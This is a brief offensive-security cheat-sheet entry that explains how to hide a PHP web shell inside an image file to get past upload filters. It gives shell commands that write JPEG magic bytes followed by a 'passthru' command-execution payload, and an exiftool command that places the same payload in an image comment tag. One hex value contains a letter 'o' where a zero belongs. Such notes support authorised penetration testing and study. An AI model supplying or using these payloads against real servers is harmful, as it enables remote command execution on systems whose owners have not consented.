Uploading php shells in images...only need the first "magic bytes". Don't necessarily need to append shell to a full image.
see Cheat Sheets and Syntax > Extensions / Files / Permissions > Magic Bytes File Types 

$ echo 'FFD8FFEo' | xxd -r -p > shell.jpg
$ echo '<?php passthru($_GET['cmd']); ?>' >> shell.jpg
$ cat shell.jpg
ÿOÿ<?php passthru($_GET[cmd]); ?>


or use exiftool to put code in tags:
exiftool -comment='<?php passthru($_GET[cmd]); ?>' image.jpg

Include your image in the webpage and you have command exec!
